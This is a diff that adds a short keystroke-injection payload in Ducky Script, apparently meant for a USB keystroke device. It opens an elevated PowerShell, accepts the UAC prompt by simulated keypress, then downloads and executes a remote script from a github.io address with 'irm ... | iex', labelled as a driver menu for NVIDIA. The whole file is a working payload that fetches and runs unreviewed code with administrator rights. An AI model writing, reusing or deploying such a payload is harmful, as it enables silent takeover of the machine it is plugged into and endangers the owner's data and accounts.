@@ -1,0 +1,10 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb RunAs
+ENTER
+DELAY 1500
+ALT y
+DELAY 1000
+STRING irm https://pluizigegamer.github.io/Driver/menu.ps1 | iex; & { menu -TargetId nvidia }
+ENTER
